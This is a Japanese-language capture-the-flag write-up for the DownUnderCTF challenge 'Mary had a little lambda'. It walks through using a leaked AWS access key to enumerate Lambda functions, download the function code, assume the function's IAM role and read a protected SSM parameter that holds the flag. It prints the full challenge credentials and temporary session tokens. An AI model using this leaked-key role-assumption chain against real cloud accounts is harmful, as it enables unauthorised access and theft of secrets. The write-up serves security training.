# Mary had a little lambda:misc:154pts
**RE: Mary had a little lambda**  
**To: Satoki@bunkyowesterns.duc.tf**  

Dear Satoki,  

The Ministry of Australian Research into Yaks (MARY) is the leading authority of yak related research in Australia. They know a lot about long-haired domesticated cattle, but unfortunately not a lot about information security.  

They have been migrating their yak catalog application to a serverless, lambda based, architecture in AWS, but in the process have accidentally exposed an access key used by their admins. You've gotten a hold of this key, now use this access to uncover MARY's secrets!  

Regards,  
gyrospectre  

**Attachments**  
[access_key.txt](access_key.txt)  

# Solution
問題文からLambdaで何か作ったが、AWSのアクセスキーが漏れてしまったようだ。  
配布されたファイルに、以下の通りキーが書かれていた。  
```
[devopsadmin]
aws_access_key_id=AKIAXC42U7VJ2XOBQKGI
aws_secret_access_key=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
region=us-east-1
```
ひとまずLambda関数を列挙する。  
```bash
$ export AWS_ACCESS_KEY_ID="AKIAXC42U7VJ2XOBQKGI"
$ export AWS_SECRET_ACCESS_KEY="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"
$ export AWS_DEFAULT_REGION="us-east-1"
$ aws lambda list-functions
{
    "Functions": [
        {
            "FunctionName": "yakbase",
            "FunctionArn": "arn:aws:lambda:us-east-1:487266254163:function:yakbase",
            "Runtime": "python3.13",
            "Role": "arn:aws:iam::487266254163:role/lambda_role",
            "Handler": "yakbase.lambda_handler",
            "CodeSize": 623,
            "Description": "",
            "Timeout": 30,
            "MemorySize": 128,
            "LastModified": "2025-07-14T12:42:45.148+0000",
            "CodeSha256": "TJjcu+uixucgk+66VOvlNYdT4ifRe6bgdAQxWujMwVM=",
            "Version": "$LATEST",
            "TracingConfig": {
                "Mode": "PassThrough"
            },
            "RevisionId": "6e45ccea-697d-4cd8-b606-67577b601b0b",
            "Layers": [
                {
                    "Arn": "arn:aws:lambda:us-east-1:487266254163:layer:main-layer:1",
                    "CodeSize": 689581
                }
            ],
            "PackageType": "Zip",
            "Architectures": [
                "x86_64"
            ],
            "EphemeralStorage": {
                "Size": 512
            },
            "SnapStart": {
                "ApplyOn": "None",
                "OptimizationStatus": "Off"
            }
        }
    ]
}
```
`yakbase`なるものがあるようなので、ZipのDLを試みる。  
```bash
$ aws lambda get-function --function-name yakbase --query 'Code.Location' --output text
https://prod-04-2014-tasks.s3.us-east-1.amazonaws.com/snapshots/487266254163/yakbase-f70d7c3a-5267-425f-8ed2-4c7a9497db04?versionId=AWtrEWcqRUhNouC7YHffyafILNKu2lrj&X-Amz-Security-Token=IQoJb3JpZ2luX2VjEJ3%2F%2F%2F%2F%2F%2F%2F%2F%2F%2FwEaCXVzLWVhc3QtMSJIMEYCIQCou1j1Zvtb54zqrQzWSeYfz5%2FzExfQvZHTIm4wy0botQIhAIqRCfoXgXC0H3vNLVtUkyGlcMyRBUMakHxsPSp9dfKrKpICCLX%2F%2F%2F%2F%2F%2F%2F%2F%2F%2FwEQABoMNzQ5Njc4OTAyODM5IgzvTKoQTCezqnnmyK8q5gHHG5wonoPdpqbMejpeGMcUFJ2V6Q8j93lu63pvVLmXvEhyMkQAlpBfHECsgHmNgk0%2BzR94dd5kLfM5qcjabVP6wqbLjctT1ZRsQYroMQq3qv3fXDqZiDZrETNzHDNY7qtkLgKosf2ECNFRKRJqeYFwxegN8IOPWbA2hxwWFlioUXL%2BniZLEpHY73j4Xnm6Wl4Iby7lQaKmPwrPgQVFWjpD2tE1nkjtIAuBnlIlZnnhyLFnGLv%2BMurxloDxOlxPWIXP%2B0bG1l7q%2Fb52Z4htmSP2EUcF4E2vnpsaNpSm%2BOSDt1Es6dyjkDDg2PHDBjqOAULa4DNoviuNZoIvS%2Bb6vLd63WWzq7PyCVhH14qwerJa6Nyvz39gaS6pUeuXDSCFBF%2F6A46EA8jBikDhk4FVZxR0OC1FW9Zb%2BOr9yI3lw9cRjCf1nPrvcv4zOMeV1%2FeFQwtNaBWxsEZyN%2Fnr%2Fze9yoMvdCpuXxqmnhJxItLWGntNmOGBNBpxRZnP5lmAPpU%3D&X-Amz-Algorithm=AWS4-HMAC-SHA256&X-Amz-Date=20250720T151823Z&X-Amz-SignedHeaders=host&X-Amz-Expires=600&X-Amz-Credential=ASIA25DCYHY362AC64SB%2F20250720%2Fus-east-1%2Fs3%2Faws4_request&X-Amz-Signature=5f701468d0c0c8f78a4c3387c441e0caf01c9f2e6531a32de6868fcbe7606e70
$ curl 'https://prod-04-2014-tasks.s3.us-east-1.amazonaws.com/snapshots/487266254163/yakbase-f70d7c3a-5267-425f-8ed2-4c7a9497db04?versionId=AWtrEWcqRUhNouC7YHffyafILNKu2lrj&X-Amz-Security-Token=IQoJb3JpZ2luX2VjEJ3%2F%2F%2F%2F%2F%2F%2F%2F%2F%2FwEaCXVzLWVhc3QtMSJIMEYCIQCou1j1Zvtb54zqrQzWSeYfz5%2FzExfQvZHTIm4wy0botQIhAIqRCfoXgXC0H3vNLVtUkyGlcMyRBUMakHxsPSp9dfKrKpICCLX%2F%2F%2F%2F%2F%2F%2F%2F%2F%2FwEQABoMNzQ5Njc4OTAyODM5IgzvTKoQTCezqnnmyK8q5gHHG5wonoPdpqbMejpeGMcUFJ2V6Q8j93lu63pvVLmXvEhyMkQAlpBfHECsgHmNgk0%2BzR94dd5kLfM5qcjabVP6wqbLjctT1ZRsQYroMQq3qv3fXDqZiDZrETNzHDNY7qtkLgKosf2ECNFRKRJqeYFwxegN8IOPWbA2hxwWFlioUXL%2BniZLEpHY73j4Xnm6Wl4Iby7lQaKmPwrPgQVFWjpD2tE1nkjtIAuBnlIlZnnhyLFnGLv%2BMurxloDxOlxPWIXP%2B0bG1l7q%2Fb52Z4htmSP2EUcF4E2vnpsaNpSm%2BOSDt1Es6dyjkDDg2PHDBjqOAULa4DNoviuNZoIvS%2Bb6vLd63WWzq7PyCVhH14qwerJa6Nyvz39gaS6pUeuXDSCFBF%2F6A46EA8jBikDhk4FVZxR0OC1FW9Zb%2BOr9yI3lw9cRjCf1nPrvcv4zOMeV1%2FeFQwtNaBWxsEZyN%2Fnr%2Fze9yoMvdCpuXxqmnhJxItLWGntNmOGBNBpxRZnP5lmAPpU%3D&X-Amz-Algorithm=AWS4-HMAC-SHA256&X-Amz-Date=20250720T151823Z&X-Amz-SignedHeaders=host&X-Amz-Expires=600&X-Amz-Credential=ASIA25DCYHY362AC64SB%2F20250720%2Fus-east-1%2Fs3%2Faws4_request&X-Amz-Signature=5f701468d0c0c8f78a4c3387c441e0caf01c9f2e6531a32de6868fcbe7606e70' -o lambda_code.zip
  % Total    % Received % Xferd  Average Speed   Time    Time     Time  Current
                                 Dload  Upload   Total   Spent    Left  Speed
100   623  100   623    0     0    890      0 --:--:-- --:--:-- --:--:--   890
```
DLすると中に以下のyakbase.pyが含まれていた。  
```py
import os
import json
import logging
import boto3
import mysql.connector

logger = logging.getLogger()
logger.setLevel(logging.INFO)

def lambda_handler(event, context):
    session = boto3.Session()
    ssm = session.client('ssm')

    dbpass = ssm.get_parameter(Name="/production/database/password", WithDecryption=True)['Parameter']['Value']

    mydb = mysql.connector.connect(
       host="10.10.1.1",
       user="dbuser",
       password=dbpass,
       database="BovineDb"
    )
    cursor = mydb.cursor()
    cursor.execute("SELECT * FROM bovines")

    results = cursor.fetchall()
    
    # For testing without the DB!
    #results = [(1, 'Yak', 'Hairy', False),(2, 'Bison', 'Large', True)]

    numresults = len(results)
    response = f"Database contains {numresults} bovines."

    logger.info(response)

    return {
        'statusCode' : 200,
        'body': response
    }
```
SSM Parameter Storeから`/production/database/password`を取得しているようだ。  
悪用できそうな目立った脆弱性もない。  
```bash
$ aws ssm get-parameter --name "/production/database/password" --with-decryption --query "Parameter.Value" --output text

An error occurred (AccessDeniedException) when calling the GetParameter operation: User: arn:aws:iam::487266254163:user/devopsadmin is not authorized to perform: ssm:GetParameter on resource: arn:aws:ssm:us-east-1:487266254163:parameter/production/database/password because no identity-based policy allows the ssm:GetParameter action
```
さすがに`ssm:GetParameter`はできないようだ。  
ここで、可能かは不明だがLambdaのロールを引き継げば取得できそうだと気づく。  
`arn:aws:iam::487266254163:role/lambda_role`はすでに取得できているため、こちらを利用する。  
```bash
$ aws sts assume-role --role-arn "arn:aws:iam::487266254163:role/lambda_role" --role-session-name satok --output json
{
    "Credentials": {
        "AccessKeyId": "ASIAXC42U7VJY4MUCMJ7",
        "SecretAccessKey": "YvqWS7sUk17OdWFQue5jwhhZc/F9dM9vQVmWo9dU",
        "SessionToken": "FwoGZXIvYXdzELn//////////wEaDENsa6bg50dho0/4pyKpAdwrqMOORTgA7oVr+0z15z/h0qpBXOlfS40crS8+13GWKoGiSRy6cQBP5ql+5Ul+DrYHnPdnW6lYO0eJhqR/+pCicwYLjBR3itbi57a+W61xXOezlUH2RRVCXRK4GCidKPGU8ZyjNsoa749bf9v6bDbRVhTXgwcqRbHksYCwXdAfLCjDtTqek9bTAS1XLGbiVKvXim3zQXII9cDbfZQ/vytN1e3AI3H3T5wosJv0wwYyLe1p2gSThOKl/AmMteDCmrwWcWCvVb6w75WPyU4vC2oavzRa+WMbIGhfuZWjCQ==",
        "Expiration": "2025-07-20T16:39:28Z"
    },
    "AssumedRoleUser": {
        "AssumedRoleId": "AROAXC42U7VJRLSSOYQRI:satok",
        "Arn": "arn:aws:sts::487266254163:assumed-role/lambda_role/satok"
    }
}
```
うまく引き継げたようだ。  
もう一度、`/production/database/password`を取得する。  
```bash
$ export AWS_ACCESS_KEY_ID="ASIAXC42U7VJY4MUCMJ7"
$ export AWS_SECRET_ACCESS_KEY="YvqWS7sUk17OdWFQue5jwhhZc/F9dM9vQVmWo9dU"
$ export AWS_SESSION_TOKEN="FwoGZXIvYXdzELn//////////wEaDENsa6bg50dho0/4pyKpAdwrqMOORTgA7oVr+0z15z/h0qpBXOlfS40crS8+13GWKoGiSRy6cQBP5ql+5Ul+DrYHnPdnW6lYO0eJhqR/+pCicwYLjBR3itbi57a+W61xXOezlUH2RRVCXRK4GCidKPGU8ZyjNsoa749bf9v6bDbRVhTXgwcqRbHksYCwXdAfLCjDtTqek9bTAS1XLGbiVKvXim3zQXII9cDbfZQ/vytN1e3AI3H3T5wosJv0wwYyLe1p2gSThOKl/AmMteDCmrwWcWCvVb6w75WPyU4vC2oavzRa+WMbIGhfuZWjCQ=="
$ aws sts get-caller-identity
{
    "UserId": "AROAXC42U7VJRLSSOYQRI:satok",
    "Account": "487266254163",
    "Arn": "arn:aws:sts::487266254163:assumed-role/lambda_role/satok"
}
$ aws ssm get-parameter --name "/production/database/password" --with-decryption --query "Parameter.Value" --output text
DUCTF{.*#--BosMutusOfTheTibetanPlateau--#*.}
```
flagが得られた。  

## DUCTF{.*#--BosMutusOfTheTibetanPlateau--#*.}